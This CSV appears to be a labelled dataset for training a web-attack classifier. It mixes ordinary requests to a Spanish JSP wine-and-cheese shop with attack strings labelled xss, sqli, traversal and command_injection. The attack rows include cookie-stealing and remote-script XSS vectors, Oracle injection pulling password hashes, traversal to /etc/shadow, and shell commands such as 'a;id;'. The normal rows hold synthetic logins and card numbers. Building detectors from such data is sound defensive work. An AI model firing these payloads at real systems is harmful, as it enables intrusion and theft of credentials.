payload,type
"<A HREF=""http://0x42.0x0000066.0x7.0x93/"">XSS</A>",xss
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=34&B1=A%F1adir+al+carrito,normal
"<div id=d><x xmlns=""><iframe onload=javascript:alert(1)""></div> <script>d.innerHTML=d.innerHTML</script>",xss
publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=31&B1=A%F1adir+al+carrito,normal
miembros/index.jsp,normal
global/titulo.jsp,normal
"admin"" or ""1""=""1""/*",sqli
"<? foo=""><script>javascript:alert(1)</script>"">",xss
"""<script>alert(""""WXSS"""")</script>""",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"""`'><script>\x20javascript:alert(1)</script>",xss
&#x3C;,xss
..%252f..%252f..%252f..%252f{FILE},traversal
global/estilos.css,normal
miembros/editar.jsp?modo=registro&login=wicht&password=Cho5Readu3a&nombre=Iago&apellidos=Casademonts&email=abdushilov%40mundoapple.kn&dni=21762453Z&direccion=Plaza+Conde+De+Carlet%2C+40+&ciudad=Beires&cp=03180&provincia=Palencia&ntc=4300788041091326&B1=Registrar,normal
publico/pagar.jsp?modo=insertar&precio=4282&B1=Confirmar,normal
publico/miembros.jsp,normal
global/titulo.jsp,normal
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},traversal
miembros/index.jsp,normal
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},traversal
publico/autenticar.jsp?modo=entrar&login=jasmann&pwd=Co4si35a&remember=on&B1=Entrar,normal
%252e%252e/{FILE},traversal
publico/miembros.jsp,normal
')%20or%20('x'='x,sqli
imagenes/1.gif,normal
miembros/index.jsp,normal
%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE},traversal
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},traversal
0x2e0x2e0x2f{FILE},traversal
global/estilos.css,normal
"<table BACKGROUND=""javascript:document.vulnerable=true;"">",xss
miembros/editar.jsp?modo=registro&login=mag8&password=d6ntrotr566&nombre=Tubal&apellidos=Arbel%E1ez+Grippo&email=barnett%40micaelagriga.mw&dni=55585768N&direccion=Pasaje+Alcobendas+S%2FN%2C+&ciudad=Alborea&cp=25152&provincia=Guadalajara&ntc=5181004596461757&B1=Registrar,normal
global/creditos.jsp,normal
global/menum.jsp,normal
"\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt=\'",xss
imagenes/3.gif,normal
miembros/imagenes/castro.jpg,normal
"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",xss
miembros/salir.jsp,normal
global/estilos.css,normal
<embed code=%(scriptlet)s></embed>,xss
imagenes/1.gif,normal
miembros/imagenes/ogono.jpg,normal
<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->,xss
"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",xss
"&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\""XSS\"")';&lt;/STYLE&gt;",xss
"<a href=""javascript\x0D:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
<scr<script>ipt>alert(1)</scr</script>ipt>,xss
1oo&1: select * from users where id=1 + \+%\ or 1=1 -- 1,sqli
'*',sqli
imagenes/3.gif,normal
publico/autenticar.jsp?modo=entrar&login=odelia&pwd=masTELeRo&remember=off&B1=Entrar,normal
imagenes/nuestratierra.jpg,normal
publico/registro.jsp?modo=registro&login=torcac2&password=pir%F3scafo&nombre=Agostina&apellidos=Camino+De+Mendonca&email=komarov%40docerosas.dk&dni=92106863M&direccion=Calle+Radio%2C+89+10F&ciudad=Torreblascopedro&cp=31153&provincia=Asturias&ntc=6202334892240470&B1=Registrar,normal
'); alert('xss'); var x=',xss
imagenes/2.gif,normal
"""`'><script>\xE2\x80\x88javascript:alert(1)</script>",xss
imagenes/2.gif,normal
&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
"<marquee onScroll marquee onScroll=""javascript:javascript:alert(1)""></marquee onScroll>",xss
&lt;,xss
"<img src=# onerror\x3D""javascript:alert(1)"" >",xss
imagenes/logo.gif,normal
<body/onload=&lt;!--&gt;&#10alert(1)>,xss
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=34&B1=A%F1adir+al+carrito,normal
"""<INPUT TYPE=""""IMAGE"""" SRC=""""javascript:alert('XSS');"""">""",xss
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,xss
imagenes/cmenbul.gif,normal
"<?xml version=""1.0""?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>",xss
'sqlattempt1,sqli
"exec sp_addlogin 'name' , 'password'",sqli
..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE},traversal
miembros/imagenes/zarauz.jpg,normal
miembros/imagenes/castro.jpg,normal
"<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(""XSS"")>",xss
<script\x2F>javascript:alert(1)</script>,xss
publico/pagar.jsp?modo=insertar&precio=9620&B1=Pasar+por+caja,normal
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
publico/productos.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
%252e%252e/{FILE},traversal
imagenes/1.gif,normal
publico/pagar.jsp?modo=insertar&precio=1096&B1=Confirmar,normal
"<script src=""#"">{alert(1)}</script>;1",xss
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"'"">><marquee><h1>XSS</h1></marquee>   ",xss
miembros/editar.jsp?modo=registro&login=stiles&password=5a68i5ru9i2&nombre=Selene&apellidos=De+Asbaje+Abarzuza&email=guerra_russinov%40weat.fj&dni=68822552C&direccion=C%2F+Cabo+Alomar+Blanes+122+10%3FB&ciudad=Alam%FAs%2C+Els&cp=43774&provincia=A+Coru%F1a&ntc=8812117919949504&B1=Registrar,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
index.jsp,normal
? or 1=1 --,sqli
miembros/fotos.jsp,normal
"""`'><script>\x20javascript:alert(1)</script>",xss
&#60;IMG SRC&#61;&#34;jav&#38;&#35;x09&#59;ascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;,xss
miembros/index.jsp,normal
<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>   ,xss
/..\{FILE},traversal
"<iframe %00 src=""&Tab;javascript:prompt(1)&Tab;""%00>",xss
imagenes/cmenbul.gif,normal
miembros/imagenes/castro.jpg,normal
"<a href=""javascript\x3Ajavascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
global/menum.jsp,normal
..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216{FILE},traversal
imagenes/nuestratierra.jpg,normal
"<IMG SRC=x onload=""alert(String.fromCharCode(88,83,83))"">",xss
<IMG%20SRC=JaVaScRiPt:alert('WXSS')>,xss
../../../../../../../../../../../../etc/shadow%00,traversal
imagenes/2.gif,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
publico/autenticar.jsp?modo=entrar&login=winnah&pwd=POlvORADuQue&remember=off&B1=Entrar,normal
%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\{FILE},traversal
"ABC<div style=""x:expression\x00(javascript:alert(1)"">DEF",xss
"<a href=""\x03javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/registro.jsp?modo=registro&login=eward&password=%24despumar&nombre=Rory&apellidos=Naredo+Reggiardo&email=korey_molina%40juguetespersonales.gob&dni=37068097D&direccion=Calle+Fausto+Fraile+0+&ciudad=Aracena&cp=17256&provincia=Palencia&ntc=3362439041972349&B1=Registrar,normal
"<a href=""javas\x06cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
imagenes/cmenbul.gif,normal
miembros/imagenes/castro.jpg,normal
<IMG SRC=javascript:alert(&quot;XSS&quot;)>,xss
<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->,xss
"<IMG SRC=`javascript:alert(""XSS says, 'XSS'"")`>",xss
"""`'><script>\x2Bjavascript:alert(1)</script>",xss
publico/registro.jsp?modo=registro&login=chungen&password=6r_o733300e&nombre=Argentino&apellidos=Gallart+Coc%F3m&email=edmunds.emil%40carimartin.io&dni=80483953F&direccion=Glorieta+Antonio+Molina+87%2C+&ciudad=Sari%F1ena&cp=42223&provincia=Guadalajara&ntc=6206191254660151&B1=Registrar,normal
imagenes/2.gif,normal
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidad=61&B1=A%F1adir+al+carrito,normal
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i,sqli
publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=4&B1=A%F1adir+al+carrito,normal
"<;IMG STYLE="";xss:expr/*XSS*/ession(alert(';XSS';))"";>;",xss
or,sqli
imagenes/2.gif,normal
publico/productos.jsp,normal
imagenes/logo.gif,normal
imagenes/1.gif,normal
imagenes/3.gif,normal
imagenes/2.gif,normal
..%255c..%255c..%255c..%255c..%255c..%255c{FILE},traversal
global/creditos.jsp,normal
"""<<SCRIPT>alert(""""XSS"""");//<</SCRIPT>""",xss
"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",xss
.//..//.//..//.//..//.//..//.//..//.//..//{FILE},traversal
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>,xss
global/creditos.jsp,normal
miembros/salir.jsp,normal
miembros/imagenes/ogono.jpg,normal
..//..//..//..//{FILE},traversal
"""<META HTTP-EQUIV=""""refresh"""" CONTENT=""""0; URL=http://;URL=javascript:alert('XSS');"""">""",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,traversal
""" or """" """,sqli
miembros/imagenes/castro.jpg,normal
<script\x0D>javascript:alert(1)</script>,xss
"<applet onReadyStateChange applet onReadyStateChange=""javascript:javascript:alert(1)""></applet onReadyStateChange>",xss
imagenes/logo.gif,normal
imagenes/logo.gif,normal
..\..\\..\..\\..\..\\..\..\\{FILE},traversal
"<img \x00src=x onerror=""javascript:alert(1)"">",xss
imagenes/1.gif,normal
miembros/imagenes/ogono.jpg,normal
"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",xss
miembros/index.jsp,normal
miembros/imagenes/castro.jpg,normal
"<;STYLE>;@im\port';\ja\vasc\ript:alert("";XSS"";)';;<;/STYLE>;",xss
imagenes/3.gif,normal
global/estilos.css,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/imagenes/ogono.jpg,normal
"s:os: select * from users where id=1 or "":%"" or 1=1 -- 1",sqli
"<IMG SRC=x onscroll=""alert(String.fromCharCode(88,83,83))"">",xss
or 1=1,sqli
publico/autenticar.jsp?modo=entrar&login=westgart&pwd=embo4ina80&remember=on&B1=Entrar,normal
..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,traversal
"""<!-- -- --><script>document.write(""""XSS-XSS-XSS"""");</script><!-- -- -->""",xss
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i",sqli
publico/registro.jsp?modo=registro&login=toolbox&password=p870en538r7&nombre=Genesis&apellidos=Aristiz%E1bal+Faura&email=halm%40sietepeines.ht&dni=43134733G&direccion=Calle+Pare+Joaquim+Roig+S.f.+S%2FN%2C+2%3FF&ciudad=Hortezuela+de+Oc%E9n&cp=15801&provincia=La+Rioja&ntc=2815769225379997&B1=Registrar,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/fotos.jsp,normal
%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE},traversal
global/creditos.jsp,normal
global/creditos.jsp,normal
..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{FILE},traversal
%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,traversal
imagenes/1.gif,normal
"<IMG SRC=x ondragleave=""alert(String.fromCharCode(88,83,83))"">",xss
</title><SCRIPT>document.vulnerable=true;</script>,xss
"<input type=""text"" value=`` <div/onmouseover='alert(1)'>X</div>",xss
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE},traversal
/./././././././././././etc/shadow,traversal
"<img DYNSRC=""javascript:document.vulnerable=true;"">",xss
%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},traversal
miembros/salir.jsp,normal
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\..\{FILE},traversal
http://www.<script>alert(1)</script .com,xss
<font style='color:expression(alert(document.cookie))'>,xss
publico/miembros.jsp,normal
publico/carrito.jsp,normal
imagenes/2.gif,normal
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",xss
publico/carrito.jsp,normal
"<LAYER SRC=""%(scriptlet)s""></LAYER>",xss
"s?{s: select * from users where id=1 or ""]{"" or 1=1 -- 1",sqli
..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{FILE},traversal
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1),xss
"<x style=""behavior:url(%(sct)s)"">",xss
<IMG SRC=javascrscriptipt:alert('XSS')>,xss
imagenes/2.gif,normal
<;!--[if gte IE 4]>;           ,xss
"""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF ",xss
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=39&B1=A%F1adir+al+carrito,normal
a|/usr/bin/id,command_injection
publico/registro.jsp?modo=registro&login=warrello2&password=0260l6st116&nombre=Piedad&apellidos=Sevilla+Subauste&email=marchard%40mailboxrussia.kw&dni=85125612J&direccion=C%2F+Guardia+Civil%2C+90%2C+&ciudad=Estamariu&cp=14240&provincia=Almer%EDa&ntc=7024918540973284&B1=Registrar,normal
"&lt;SCRIPT/XSS SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",xss
..%2f..%2f..%2f{FILE},traversal
global/menum.jsp,normal
publico/carrito.jsp,normal
publico/caracteristicas.jsp?id=1,normal
imagenes/3.gif,normal
./.././../{FILE},traversal
"<iframe onload iframe onload=""javascript:javascript:alert(1)""></iframe onload>",xss
"<body onbeforeunload body onbeforeunload=""javascript:javascript:alert(1)""></body onbeforeunload>",xss
"UEv11: select * from users where id=1 union select @ 1$,version() -- 1",sqli
publico/productos.jsp,normal
"<IMG SRC=x oncuechange=""alert(String.fromCharCode(88,83,83))"">",xss
global/creditos.jsp,normal
imagenes/1.gif,normal
publico/caracteristicas.jsp?id=1,normal
publico/productos.jsp,normal
"<embed type=""image"" src=%(scriptlet)s></embed>",xss
miembros/fotos.jsp,normal
"s;os: select * from users where id=1 or "";&"" or 1=1 -- 1",sqli
index.jsp,normal
"<a href=""javas\x03cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<IMG LOWSRC=""javascript:alert('XSS')"">",xss
"<script>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://www.securitycompass.com/xss.js""></script>",xss
"<div STYLE=""background-image: url(&#1;javascript:document.vulnerable=true;)"">",xss
publico/registro.jsp?modo=registro&login=pauli&password=SOBErmejA&nombre=L%EDa&apellidos=M%E9ndez+Testua&email=beaumont%40lasmilyuna.gi&dni=35936056M&direccion=Calle+Alpens+41%2C+2%3FG&ciudad=Hinojal&cp=19310&provincia=Lleida&ntc=8789249856609623&B1=Registrar,normal
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=96&B1=A%F1adir+al+carrito,normal
index.jsp,normal
imagenes/2.gif,normal
imagenes/nuestratierra.jpg,normal
"`""'><img src=xxx:x onerror\x00=javascript:alert(1)>",xss
publico/caracteristicas.jsp?id=1,normal
miembros/fotos.jsp,normal
global/menum.jsp,normal
<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>,xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"<form><button formaction=""javascript:alert(XSS)"">lol",xss
imagenes/cmenbul.gif,normal
"sv(s: select * from users where id=1 or ""@("" or 1=1 -- 1",sqli
publico/miembros.jsp,normal
"<frameset onBlur frameset onBlur=""javascript:javascript:alert(1)""></frameset onBlur>",xss
..%2f..%2f{FILE},traversal
<svg contentScriptType=text/vbs><script>MsgBox+1,xss
global/menum.jsp,normal
miembros/editar.jsp?modo=registro&login=sabanaya4&password=RECo%2BvEro&nombre=Indamira&apellidos=Dom%E8nech+Mila&email=thorne-smith%40sandrasummer.fm&dni=45478096N&direccion=Pla%E7a+Pau+Picasso%2C+88%2C+&ciudad=Marchena&cp=37724&provincia=Burgos&ntc=8486012682683585&B1=Registrar,normal
"s&&o1: select * from users where id='1' or ||/1=1 union select 1,version() -- 1'",sqli
&#60;SCRIPT SRC&#61;http&#58;&#47;&#47;testsite.com&#47;xss.js,xss
<a onmouseover=alert(document.cookie)>xxs link</a>,xss
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss
publico/productos.jsp,normal
miembros/index.jsp,normal
miembros/editar.jsp?modo=registro&login=quill&password=2u27lad9r4&nombre=Dalmiro&apellidos=Erill+Crespo&email=myers%40naturalchild.so&dni=91438020W&direccion=C%2F+Escultor+Julio+Gonzalez+88%2C+&ciudad=Amorebieta-Etxano&cp=05229&provincia=Teruel&ntc=6048554064822313&B1=Registrar,normal
</script></script><<<<script><>>>><<<script>alert(123)</script>  ,xss
<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>,xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/registro.jsp?modo=registro&login=arda&password=e4can7ilader0&nombre=Aristi%F3n&apellidos=Masvidal+Canino&email=pepe.whitehead%40jaxiaabogadosyeconomistas.nr&dni=45518730M&direccion=Alqueria+De+Coca+38%2C+&ciudad=Membr%EDo&cp=05140&provincia=Guadalajara&ntc=1729966765537707&B1=Registrar,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/index.jsp,normal
"<a target=""x"" href=""xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",xss
global/menum.jsp,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i",sqli
publico/vaciar.jsp?B2=Vaciar+carrito,normal
imagenes/nuestratierra.jpg,normal
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},traversal
global/menum.jsp,normal
"so()U: select * from users where id='1' + (\) union select 1,@@VERSION -- 1'",sqli
"""<div style=""""behaviour: url([link to code]);"""">""",xss
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss
imagenes/logo.gif,normal
"<a href=""\x18javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,traversal
imagenes/nuestratierra.jpg,normal
publico/miembros.jsp,normal
global/estilos.css,normal
..%2f..%2f..%2f..%2f..%2f{FILE},traversal
"<A HREF=""http://66.102.7.147/"">XSS</A>",xss
imagenes/1.gif,normal
<img src=``&NewLine; onerror=alert(1)&NewLine;,xss
global/creditos.jsp,normal
"exp/*<A STYLE='no\xss:noxss(""*//*"");",xss
miembros/editar.jsp?modo=registro&login=nickonov&password=p%24ipo&nombre=Agat%F3n&apellidos=Ceccarelli+Urp%ED&email=werkmeister%4019horas.zr&dni=85744372G&direccion=Calle+Pravia+74%2C+&ciudad=Villaviciosa+de+Od%F3n&cp=31640&provincia=Salamanca&ntc=7022174850420090&B1=Registrar,normal
miembros/imagenes/zarauz.jpg,normal
<script>a=/XSS/\ndocument.vulnerable=true;</script>,xss
"<FRAMESET><FRAME SRC=""javascript:document.vulnerable=true;""></frameset>",xss
..........................................................................\{FILE},traversal
<frameset onload=javascript:javascript:alert(1)></frameset>,xss
miembros/imagenes/castro.jpg,normal
"<script language=""JavaScript"">alert('XSS')</script>",xss
Execute(MsgBox(chr(88)&chr(83)&chr(83)))<,xss
"""<XSS STYLE=""""behavior: url(xss.htc);"""">""",xss
"<html onmousemove html onmousemove=""javascript:javascript:alert(1)""></html onmousemove>",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"""`'><script>\xE2\x80\x87javascript:alert(1)</script>",xss
global/titulo.jsp,normal
publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=100&cantidad=3&B1=A%F1adir+al+carrito,normal
global/titulo.jsp,normal
"s?UEf: select * from users where id=1 or 1#""? union select version(),version() -- 1",sqli
a;id;,command_injection
o(n)&: select * from users where id=1 %($) or 1=1 -- 1,sqli
publico/registro.jsp?modo=registro&login=printers&password=usufrut*uar&nombre=Elido&apellidos=Valdiviezo+Montull&email=bleifer%40muchacha.com.bh&dni=59952544P&direccion=C%2F+Mare+De+Deu+De+La+Merce%2C+S%2FN%2C+8-E&ciudad=Pinilla+de+los+Barruecos&cp=07150&provincia=Girona&ntc=3755385437912895&B1=Registrar,normal
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
"<img src\x00=x onerror=""javascript:alert(1)"">",xss
..%2f..%2f..%2f..%2f{FILE},traversal
"<META HTTP-EQUIV=""Link"" Content=""<%(css)s>; REL=stylesheet"">",xss
"<base HREF=""javascript:document.vulnerable=true;//"">",xss
imagenes/2.gif,normal
"<;BASE HREF="";javascript:alert(';XSS';);//"";>;",xss
"style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);"" a=""",xss
publico/autenticar.jsp?modo=entrar&login=sayers&pwd=Median2l&remember=on&B1=Entrar,normal
global/estilos.css,normal
publico/productos.jsp,normal
imagenes/3.gif,normal
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,xss
"<IMG SRC=x onvolumechange=""alert(String.fromCharCode(88,83,83))"">",xss
miembros/imagenes/castro.jpg,normal
global/menum.jsp,normal
miembros/imagenes/ogono.jpg,normal
imagenes/1.gif,normal
miembros/imagenes/castro.jpg,normal
miembros/salir.jsp,normal
imagenes/nuestratierra.jpg,normal
...\...\...\...\...\...\...\...\{FILE},traversal
"""/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />",xss
||6,sqli
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"""exp/*<A STYLE='no\xss:noxss(""""*//*"""");xss:ex/*XSS*//*/*/pression(alert(""""XSS""""))'>""",xss
admin' or ',sqli
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,command_injection
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/fotos.jsp,normal
miembros/salir.jsp,normal
"<script> function foo(elem, doc, text) { elem.onclick = function (e) { e.__defineGetter__(text[0], function () { return true }) alert(Safe.get()); }; var event = doc.createEvent(text[1]); event.initEvent(text[2], true, true); elem.dispatchEvent(event); } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> #",xss
imagenes/nuestratierra.jpg,normal
miembros/fotos.jsp,normal
miembros/imagenes/ogono.jpg,normal
..%2f..%2f..%2f..%2f..%2f..%2f{FILE},traversal
"svc: select * from users where id=1 or ""@#"" or 1=1 -- 1",sqli
"""<FRAMESET><FRAME SRC=""""javascript:alert('XSS');""""></FRAMESET>""",xss
"ABC<div style=""x:\xC2\xA0expression(javascript:alert(1)"">DEF",xss
miembros/fotos.jsp,normal
"""><script>alert('test')</script>",xss
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foof>",xss
"""<IMG%20DYNSRC=""""javascript:alert('WXSS')"""">""",xss
"""<BR SIZE=""""&{alert('XSS')}"""">""",xss
publico/caracteristicas.jsp?id=1,normal
' or true--,sqli
"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">?",xss
publico/miembros.jsp,normal
publico/pagar.jsp?modo=insertar&precio=620&B1=Confirmar,normal
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\{FILE},traversal
"<;A HREF="";http://google:ha.ckers.org"";>;XSS<;/A>;",xss
global/creditos.jsp,normal
imagenes/2.gif,normal
*|,sqli
&LT;,xss
"<A HREF=""htt p://6 6.000146.0x7.147/"">XSS</A>",xss
"""><img src=x onerror=javascript:alert((""A""))>",xss
"<img \x00src=x onerror=""javascript:alert(1)"">",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
hi' or 1=1 --,sqli
"'';!--""<XSS>=&{()}",xss
